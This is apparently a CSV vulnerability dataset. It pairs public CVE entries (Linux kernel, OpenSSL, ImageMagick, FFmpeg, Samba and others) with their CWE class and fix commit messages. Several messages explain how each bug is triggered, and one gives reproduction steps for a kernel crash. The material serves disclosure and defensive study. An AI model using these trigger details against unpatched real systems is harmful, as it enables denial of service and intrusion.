cveID,cweID,publishedDate,cveDescription,commitMsg
CVE-2015-5330,CWE-200,2015-12-29,"ldb before 1.1.24, as used in the AD LDAP server in Samba 4.x before 4.1.22, 4.2.x before 4.2.7, and 4.3.x before 4.3.3, mishandles string lengths, which allows remote attackers to obtain sensitive information from daemon heap memory by sending crafted packets and then reading (1) an error message or (2) a database value.",
CVE-2014-3569,,2014-12-24,"The ssl23_get_client_hello function in s23_srvr.c in OpenSSL 0.9.8zc, 1.0.0o, and 1.0.1j does not properly handle attempts to use unsupported protocols, which allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via an unexpected handshake, as demonstrated by an SSLv3 handshake to a no-ssl3 application with certain error handling.  NOTE: this issue became relevant after the CVE-2014-3568 fix.",
CVE-2012-3525,CWE-20,2012-08-25,"s2s/out.c in jabberd2 2.2.16 and earlier does not verify that a request was made for an XMPP Server Dialback response, which allows remote XMPP servers to spoof domains via a (1) Verify Response or (2) Authorization Response.",
CVE-2017-12663,CWE-772,2017-08-07,ImageMagick 7.0.6-2 has a memory leak vulnerability in WriteMAPImage in coders/map.c.,
CVE-2017-8807,CWE-119,2017-11-16,vbf_stp_error in bin/varnishd/cache/cache_fetch.c in Varnish HTTP Cache 4.1.x before 4.1.9 and 5.x before 5.2.1 allows remote attackers to obtain sensitive information from process memory because a VFP_GetStorage buffer is larger than intended in certain circumstances involving -sfile Stevedore transient objects.,"The file stevedore may return a buffer larger than asked for when requesting storage. Due to lack of check for this condition, the code to copy the synthetic error memory buffer from vcl_error would overrun the buffer.  Patch by @shamger Fixes: #2429"
CVE-2016-5243,CWE-200,2016-06-27,"The tipc_nl_compat_link_dump function in net/tipc/netlink_compat.c in the Linux kernel through 4.6.3 does not properly copy a certain string, which allows local users to obtain sensitive information from kernel stack memory by reading a Netlink message.",link_info.str is a char array of size 60. Memory after the NULL byte is not initialized. Sending the whole object out can cause a leak.  Signed-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2016-8666,CWE-400,2016-10-16,"The IP stack in the Linux kernel before 4.6 allows remote attackers to cause a denial of service (stack consumption and panic) or possibly have unspecified other impact by triggering use of the GRO path for packets with tunnel stacking, as demonstrated by interleaved IPv4 headers and GRE headers, a related issue to CVE-2016-7039.","When drivers express support for TSO of encapsulated packets, they only mean that they can do it for one layer of encapsulation. Supporting additional levels would mean updating, at a minimum, more IP length fields and they are unaware of this.  No encapsulation device expresses support for handling offloaded encapsulated packets, so we won't generate these types of frames in the transmit path. However, GRO doesn't have a check for multiple levels of encapsulation and will attempt to build them.  UDP tunnel GRO actually does prevent this situation but it only handles multiple UDP tunnels stacked on top of each other. This generalizes that solution to prevent any kind of tunnel stacking that would cause problems.  Fixes: bf5a755 (""net-gre-gro: Add GRE support to the GRO stack"") Signed-off-by: Jesse Gross <jesse@kernel.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-13136,CWE-190,2019-07-01,ImageMagick before 7.0.8-50 has an integer overflow vulnerability in the function TIFFSeekCustomStream in coders/tiff.c.,
CVE-2016-2179,CWE-399,2016-09-16,"The DTLS implementation in OpenSSL before 1.1.0 does not properly restrict the lifetime of queue entries associated with unused out-of-order messages, which allows remote attackers to cause a denial of service (memory consumption) by maintaining many crafted DTLS sessions simultaneously, related to d1_lib.c, statem_dtls.c, statem_lib.c, and statem_srvr.c.",
CVE-2016-4804,CWE-119,2016-06-03,"The read_boot function in boot.c in dosfstools before 4.0 allows attackers to cause a denial of service (crash) via a crafted filesystem, which triggers a heap-based buffer overflow in the (1) read_fat function or an out-of-bounds heap read in (2) get_fat function.","The variable used for storing the FAT size (in bytes) was an unsigned int. Since the size in sectors read from the BPB was not sufficiently checked, this could end up being zero after multiplying it with the sector size while some offsets still stayed excessive. Ultimately it would cause segfaults when accessing FAT entries for which no memory was allocated.  Make it more robust by changing the types used to store FAT size to off_t and abort if there is no room for data clusters. Additionally check that FAT size is not specified as zero.  Fixes #25 and fixes #26.  Reported-by: Hanno Böck Signed-off-by: Andreas Bombe <aeb@debian.org>"
CVE-2016-7525,CWE-125,2017-04-20,Heap-based buffer overflow in coders/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.,
CVE-2012-4565,CWE-189,2012-12-21,"The tcp_illinois_info function in net/ipv4/tcp_illinois.c in the Linux kernel before 3.4.19, when the net.ipv4.tcp_congestion_control illinois setting is enabled, allows local users to cause a denial of service (divide-by-zero error and OOPS) by reading TCP stats.","Reading TCP stats when using TCP Illinois congestion control algorithm can cause a divide by zero kernel oops.  The division by zero occur in tcp_illinois_info() at:  do_div(t, ca->cnt_rtt); where ca->cnt_rtt can become zero (when rtt_reset is called)  Steps to Reproduce:  1. Register tcp_illinois:      # sysctl -w net.ipv4.tcp_congestion_control=illinois  2. Monitor internal TCP information via command ""ss -i""      # watch -d ss -i  3. Establish new TCP conn to machine  Either it fails at the initial conn, or else it needs to wait for a loss or a reset.  This is only related to reading stats.  The function avg_delay() also performs the same divide, but is guarded with a (ca->cnt_rtt > 0) at its calling point in update_params().  Thus, simply fix tcp_illinois_info().  Function tcp_illinois_info() / get_info() is called without socket lock.  Thus, eliminate any race condition on ca->cnt_rtt by using a local stack variable.  Simply reuse info.tcpv_rttcnt, as its already set to ca->cnt_rtt. Function avg_delay() is not affected by this race condition, as its called with the socket lock.  Cc: Petr Matousek <pmatouse@redhat.com> Signed-off-by: Jesper Dangaard Brouer <brouer@redhat.com> Acked-by: Eric Dumazet <edumazet@google.com> Acked-by: Stephen Hemminger <shemminger@vyatta.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-14767,CWE-119,2017-09-27,"The sdp_parse_fmtp_config_h264 function in libavformat/rtpdec_h264.c in FFmpeg before 3.3.4 mishandles empty sprop-parameter-sets values, which allows remote attackers to cause a denial of service (heap buffer overflow) or possibly have unspecified other impact via a crafted sdp file.",Fixes: rtp_sdp/poc.sdp  Found-by: Bingchang <l.bing.chang.bc@gmail.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-2085,CWE-19,2016-04-27,"The evm_verify_hmac function in security/integrity/evm/evm_main.c in the Linux kernel before 4.5 does not properly copy data, which makes it easier for local users to forge MAC values via a timing side-channel attack.","This patch fixes vulnerability CVE-2016-2085.  The problem exists because the vm_verify_hmac() function includes a use of memcmp(). Unfortunately, this allows timing side channel attacks; specifically a MAC forgery complexity drop from 2^128 to 2^12.  This patch changes the memcmp() to the cryptographically safe crypto_memneq().  Reported-by: Xiaofei Rex Guo <xiaofei.rex.guo@intel.com> Signed-off-by: Ryan Ware <ware@linux.intel.com> Cc: stable@vger.kernel.org Signed-off-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2017-7541,CWE-119,2017-07-25,The brcmf_cfg80211_mgmt_tx function in drivers/net/wireless/broadcom/brcm80211/brcmfmac/cfg80211.c in the Linux kernel before 4.12.3 allows local users to cause a denial of service (buffer overflow and system crash) or possibly gain privileges via a crafted NL80211_CMD_FRAME Netlink packet.,"The lower level nl80211 code in cfg80211 ensures that ""len"" is between 25 and NL80211_ATTR_FRAME (2304).  We subtract DOT11_MGMT_HDR_LEN (24) from ""len"" so thats's max of 2280.  However, the action_frame->data[] buffer is only BRCMF_FIL_ACTION_FRAME_SIZE (1800) bytes long so this memcpy() can overflow.  	memcpy(action_frame->data, &buf[DOT11_MGMT_HDR_LEN], 	       le16_to_cpu(action_frame->len));  Cc: stable@vger.kernel.org # 3.9.x Fixes: 18e2f61 (""brcmfmac: P2P action frame tx."") Reported-by: ""freenerguo(郭大兴)"" <freenerguo@tencent.com> Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-3951,,2016-05-02,Double free vulnerability in drivers/net/usb/cdc_ncm.c in the Linux kernel before 4.5 allows physically proximate attackers to cause a denial of service (system crash) or possibly have unspecified other impact by inserting a USB device with an invalid USB descriptor.,"usbnet_link_change will call schedule_work and should be avoided if bind is failing. Otherwise we will end up with scheduled work referring to a netdev which has gone away.  Instead of making the call conditional, we can just defer it to usbnet_probe, using the driver_info flag made for this purpose.  Fixes: 8a34b0a (""usbnet: cdc_ncm: apply usbnet_link_change"") Reported-by: Andrey Konovalov <andreyknvl@gmail.com> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Bjørn Mork <bjorn@mork.no> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-8898,CWE-476,2017-03-15,The WriteImages function in magick/constitute.c in ImageMagick before 6.9.2-4 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted image file.,
CVE-2017-6542,CWE-119,2017-03-27,"The ssh_agent_channel_data function in PuTTY before 0.68 allows remote attackers to have unspecified impact via a large length value in an agent protocol message and leveraging the ability to connect to the Unix-domain socket representing the forwarded agent connection, which trigger a buffer overflow.",
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2018-12633,CWE-362,2018-06-22,"An issue was discovered in the Linux kernel through 4.17.2. vbg_misc_device_ioctl() in drivers/virt/vboxguest/vboxguest_linux.c reads the same user data twice with copy_from_user. The header part of the user data is double-fetched, and a malicious user thread can tamper with the critical variables (hdr.size_in and hdr.size_out) in the header between the two fetches because of a race condition, leading to severe kernel errors, such as buffer over-accesses. This bug can cause a local denial of service and information leakage.","In vbg_misc_device_ioctl(), the header of the ioctl argument is copied from the userspace pointer 'arg' and saved to the kernel object 'hdr'. Then the 'version', 'size_in', and 'size_out' fields of 'hdr' are verified.  Before this commit, after the checks a buffer for the entire request would be allocated and then all data including the verified header would be copied from the userspace 'arg' pointer again.  Given that the 'arg' pointer resides in userspace, a malicious userspace process can race to change the data pointed to by 'arg' between the two copies. By doing so, the user can bypass the verifications on the ioctl argument.  This commit fixes this by using the already checked copy of the header to fill the header part of the allocated buffer and only copying the remainder of the data from userspace.  Signed-off-by: Wenwen Wang <wang6495@umn.edu> Reviewed-by: Hans de Goede <hdegoede@redhat.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2016-2187,,2016-05-02,The gtco_probe function in drivers/input/tablet/gtco.c in the Linux kernel through 4.5.2 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.,"The gtco driver expects at least one valid endpoint. If given malicious descriptors that specify 0 for the number of endpoints, it will crash in the probe function. Ensure there is at least one endpoint on the interface before using it.  Also let's fix a minor coding style issue.  The full correct report of this issue can be found in the public Red Hat Bugzilla:  https://bugzilla.redhat.com/show_bug.cgi?id=1283385  Reported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>"
CVE-2017-16527,CWE-416,2017-11-04,sound/usb/mixer.c in the Linux kernel before 4.13.8 allows local users to cause a denial of service (snd_usb_mixer_interrupt use-after-free and system crash) or possibly have unspecified other impact via a crafted USB device.,"USB-audio driver may leave a stray URB for the mixer interrupt when it exits by some error during probe.  This leads to a use-after-free error as spotted by syzkaller like:   ==================================================================   BUG: KASAN: use-after-free in snd_usb_mixer_interrupt+0x604/0x6f0   Call Trace:    <IRQ>    __dump_stack lib/dump_stack.c:16    dump_stack+0x292/0x395 lib/dump_stack.c:52    print_address_description+0x78/0x280 mm/kasan/report.c:252    kasan_report_error mm/kasan/report.c:351    kasan_report+0x23d/0x350 mm/kasan/report.c:409    __asan_report_load8_noabort+0x19/0x20 mm/kasan/report.c:430    snd_usb_mixer_interrupt+0x604/0x6f0 sound/usb/mixer.c:2490    __usb_hcd_giveback_urb+0x2e0/0x650 drivers/usb/core/hcd.c:1779    ....    Allocated by task 1484:    save_stack_trace+0x1b/0x20 arch/x86/kernel/stacktrace.c:59    save_stack+0x43/0xd0 mm/kasan/kasan.c:447    set_track mm/kasan/kasan.c:459    kasan_kmalloc+0xad/0xe0 mm/kasan/kasan.c:551    kmem_cache_alloc_trace+0x11e/0x2d0 mm/slub.c:2772    kmalloc ./include/linux/slab.h:493    kzalloc ./include/linux/slab.h:666    snd_usb_create_mixer+0x145/0x1010 sound/usb/mixer.c:2540    create_standard_mixer_quirk+0x58/0x80 sound/usb/quirks.c:516    snd_usb_create_quirk+0x92/0x100 sound/usb/quirks.c:560    create_composite_quirk+0x1c4/0x3e0 sound/usb/quirks.c:59    snd_usb_create_quirk+0x92/0x100 sound/usb/quirks.c:560    usb_audio_probe+0x1040/0x2c10 sound/usb/card.c:618    ....    Freed by task 1484:    save_stack_trace+0x1b/0x20 arch/x86/kernel/stacktrace.c:59    save_stack+0x43/0xd0 mm/kasan/kasan.c:447    set_track mm/kasan/kasan.c:459    kasan_slab_free+0x72/0xc0 mm/kasan/kasan.c:524    slab_free_hook mm/slub.c:1390    slab_free_freelist_hook mm/slub.c:1412    slab_free mm/slub.c:2988    kfree+0xf6/0x2f0 mm/slub.c:3919    snd_usb_mixer_free+0x11a/0x160 sound/usb/mixer.c:2244    snd_usb_mixer_dev_free+0x36/0x50 sound/usb/mixer.c:2250    __snd_device_free+0x1ff/0x380 sound/core/device.c:91    snd_device_free_all+0x8f/0xe0 sound/core/device.c:244    snd_card_do_free sound/core/init.c:461    release_card_device+0x47/0x170 sound/core/init.c:181    device_release+0x13f/0x210 drivers/base/core.c:814    ....  Actually such a URB is killed properly at disconnection when the device gets probed successfully, and what we need is to apply it for the error-path, too.  In this patch, we apply snd_usb_mixer_disconnect() at releasing. Also introduce a new flag, disconnected, to struct usb_mixer_interface for not performing the disconnection procedure twice.  Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2013-4588,CWE-119,2013-11-20,"Multiple stack-based buffer overflows in net/netfilter/ipvs/ip_vs_ctl.c in the Linux kernel before 2.6.33, when CONFIG_IP_VS is used, allow local users to gain privileges by leveraging the CAP_NET_ADMIN capability for (1) a getsockopt system call, related to the do_ip_vs_get_ctl function, or (2) a setsockopt system call, related to the do_ip_vs_set_ctl function.","The ipvs code has a nifty system for doing the size of ioctl command copies; it defines an array with values into which it indexes the cmd to find the right length.  Unfortunately, the ipvs code forgot to check if the cmd was in the range that the array provides, allowing for an index outside of the array, which then gives a ""garbage"" result into the length, which then gets used for copying into a stack buffer.  Fix this by adding sanity checks on these as well as the copy size.  [ horms@verge.net.au: adjusted limit to IP_VS_SO_GET_MAX ] Signed-off-by: Arjan van de Ven <arjan@linux.intel.com> Acked-by: Julian Anastasov <ja@ssi.bg> Signed-off-by: Simon Horman <horms@verge.net.au> Signed-off-by: Patrick McHardy <kaber@trash.net>"
CVE-2017-11462,CWE-415,2017-09-13,Double free vulnerability in MIT Kerberos 5 (aka krb5) allows attackers to have unspecified impact via vectors involving automatic deletion of security contexts on error.,"After gss_init_sec_context() or gss_accept_sec_context() has created a context, don't delete the mechglue context on failures from subsequent calls, even if the mechanism deletes the mech-specific context (which is allowed by RFC 2744 but not preferred).  Check for union contexts with no mechanism context in each GSS function which accepts a gss_ctx_id_t.  CVE-2017-11462:  RFC 2744 permits a GSS-API implementation to delete an existing security context on a second or subsequent call to gss_init_sec_context() or gss_accept_sec_context() if the call results in an error.  This API behavior has been found to be dangerous, leading to the possibility of memory errors in some callers.  For safety, GSS-API implementations should instead preserve existing security contexts on error until the caller deletes them.  All versions of MIT krb5 prior to this change may delete acceptor contexts on error.  Versions 1.13.4 through 1.13.7, 1.14.1 through 1.14.5, and 1.15 through 1.15.1 may also delete initiator contexts on error.  ticket: 8598 (new) target_version: 1.15-next target_version: 1.14-next tags: pullup"
CVE-2017-9202,CWE-369,2017-05-23,"imagew-cmd.c:854:45 in libimageworsener.a in ImageWorsener 1.3.1 allows remote attackers to cause a denial of service (divide-by-zero error) via a crafted image, related to imagew-api.c.","Fixes a bug that could result in division by zero, at least for a JPEG source image. Fixes issues #19, #20"
CVE-2014-9870,CWE-264,2016-08-06,"The Linux kernel before 3.11 on ARM platforms, as used in Android before 2016-08-05 on Nexus 5 and 7 (2013) devices, does not properly consider user-space access to the TPIDRURW register, which allows local users to gain privileges via a crafted application, aka Android internal bug 28749743 and Qualcomm internal bug CR561044.","Since commit 6a1c531 the user writeable TLS register was zeroed to prevent it from being used as a covert channel between two tasks.  There are more and more applications coming to Windows RT, Wine could support them, but mostly they expect to have the thread environment block (TEB) in TPIDRURW.  This patch preserves that register per thread instead of clearing it. Unlike the TPIDRURO, which is already switched, the TPIDRURW can be updated from userspace so needs careful treatment in the case that we modify TPIDRURW and call fork(). To avoid this we must always read TPIDRURW in copy_thread.  Signed-off-by: André Hentschel <nerv@dawncrow.de> Signed-off-by: Will Deacon <will.deacon@arm.com> Signed-off-by: Jonathan Austin <jonathan.austin@arm.com> Signed-off-by: Russell King <rmk+kernel@arm.linux.org.uk>"
CVE-2016-2177,CWE-190,2016-06-20,"OpenSSL through 1.0.2h incorrectly uses pointer arithmetic for heap-buffer boundary checks, which might allow remote attackers to cause a denial of service (integer overflow and application crash) or possibly have unspecified other impact by leveraging unexpected malloc behavior, related to s3_srvr.c, ssl_sess.c, and t1_lib.c.",
CVE-2014-3710,CWE-20,2014-11-05,"The donote function in readelf.c in file through 5.20, as used in the Fileinfo component in PHP 5.4.34, does not ensure that sufficient note headers are present, which allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted ELF file.",
CVE-2017-18017,CWE-416,2018-01-03,"The tcpmss_mangle_packet function in net/netfilter/xt_TCPMSS.c in the Linux kernel before 4.11, and 4.9.x before 4.9.36, allows remote attackers to cause a denial of service (use-after-free and memory corruption) or possibly have unspecified other impact by leveraging the presence of xt_TCPMSS in an iptables action.","Denys provided an awesome KASAN report pointing to an use after free in xt_TCPMSS  I have provided three patches to fix this issue, either in xt_TCPMSS or in xt_tcpudp.c. It seems xt_TCPMSS patch has the smallest possible impact.  Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Denys Fedoryshchenko <nuclearcat@nuclearcat.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2018-1999011,CWE-119,2018-07-23,FFmpeg before commit 2b46ebdbff1d8dec7a3d8ea280a612b91a582869 contains a Buffer Overflow vulnerability in asf_o format demuxer that can result in heap-buffer-overflow that may result in remote code execution. This attack appears to be exploitable via specially crafted ASF file that has to be provided as input to FFmpeg. This vulnerability appears to have been fixed in 2b46ebdbff1d8dec7a3d8ea280a612b91a582869 and later.,Fixes: integer overflow and out of array access Fixes: asfo-crash-46080c4341572a7137a162331af77f6ded45cbd7  Found-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
